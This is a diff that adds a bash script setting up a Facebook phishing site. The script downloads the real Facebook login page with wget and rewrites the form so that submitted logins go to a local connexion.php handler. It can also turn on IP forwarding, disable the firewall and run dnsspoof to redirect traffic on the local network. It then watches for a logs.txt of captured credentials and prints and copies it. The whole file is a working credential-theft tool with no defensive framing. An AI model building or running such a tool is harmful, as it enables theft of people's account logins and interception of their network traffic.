@@ -1,0 +1,106 @@
+#!/bin/bash
+framework="/var/www/facebook_phishing/"
+
+if [ ! -d $framework ]; then
+
+	echo "[+] Framework Installation ..."
+	sleep 1
+	mkdir /var/www/facebook_phishing
+	chmod 777 /var/www/facebook_phishing
+	echo ""
+	echo "[+] Creating malicious code ..."
+	sleep 1
+	cp connexion.php /var/www/facebook_phishing/
+	cp index.html /var/www/
+	echo "[*] What is the IP of the server hosting ?"
+	read local_ip
+	echo "[+] Hebergeur $local_ip"
+	sleep 1
+	sed -i -e "s#adresse#$local_ip#g" /var/www/index.html
+	echo ""
+	echo "[+] Copying Facebook login page ..."
+	sleep 1
+	wget -U firefox https://facebook.com/login.php -O /var/www/facebook_phishing/login.php
+	echo "[+] Infecting the login page ..."
+	sleep 1
+	sed -i -e "s#/login.php?login_attempt=1#connexion.php#g" /var/www/facebook_phishing/login.php
+	echo ""
+	echo "[+] Login page infected !"
+	sleep 1
+	echo ""
+	echo "[+] starting Apache service ..."
+	sleep 1
+	service apache2 start
+	clear
+	echo ""
+	echo "[*] Phishing Framework installation under ==> /var/www/facebook_phishing/"
+	echo ""
+	echo "[*] Phishing URL ==> http://localhost/facebook_phishing/login.php"
+	sleep 5
+fi
+
+wipe -s -f /var/www/facebook_phishing/logs.txt
+clear
+echo "[+] Installation detected !"
+sleep 1
+echo "[*] Would you make a DNS empoisonement (LAN only) [y/n] ?"
+read dns_spoof
+sleep 1
+if [ $dns_spoof == "y" ]; then
+	echo "[+] Activating the redirect traffic ..."
+	echo 1 > /proc/sys/net/ipv4/ip_forward
+	sleep 1
+	echo ""
+	echo "[+] Disabling the firewall ..." 
+	apt-get install gufw
+	ufw disable
+	sleep 1
+	echo ""
+	echo "[*] What is the network interface connected ?"
+	read interface
+	sleep 1
+	echo ""
+	echo "[+] Enabling DNS spoofing ..."
+	gnome-terminal -e "dnsspoof -i $interface -f hosts.txt"
+	sleep 1
+	echo ""
+fi
+	
+echo "[*] Press Enter to start the sniffer indentifiants ..."
+read user
+clear
+
+presence=""
+
+while test "$presence" != /var/www/facebook_phishing/logs.txt
+
+do
+
+presence=$(ls /var/www/facebook_phishing/logs.txt)
+clear
+echo "[*] listening for connections ..."
+sleep 1
+
+done
+
+if [ $presence == "/var/www/facebook_phishing/logs.txt" ]; then
+	
+	clear
+	echo "[+] Login intercepted !"
+	sleep 1
+	echo ""
+	cat "/var/www/facebook_phishing/logs.txt"
+	sleep 1
+	echo "[+] Logs copying ..."
+	cp /var/www/facebook_phishing/logs.txt /logs.txt
+	sleep 1
+	echo ""
+	echo "Press Enter to exit ..."
+	read user
+	ufw enable 
+	echo 0 > /proc/sys/net/ipv4/ip_forward
+	echo "[+] Default configuration restaured !"
+	sleep 1	
+fi
+
+
